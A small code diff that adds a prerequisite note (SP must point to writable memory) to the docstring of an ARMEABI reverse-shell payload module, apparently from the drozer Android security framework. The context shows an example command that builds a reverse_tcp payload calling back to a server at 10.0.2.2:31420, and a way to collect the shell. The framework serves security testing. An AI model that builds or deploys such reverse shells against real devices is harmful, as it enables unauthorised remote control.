@@ -19,6 +19,9 @@ class ARMEABI(Module, common.ShellCode):
     
     You can collect the shell by connecting to the server and sending 'COLLECT'
     as the first line.
+
+    Prerequisites:
+      * SP is pointing to a RW location in memory
     """
     examples = """
     $ drozer payload build weasel.reverse_tcp.armeabi --server 10.0.2.2:31420
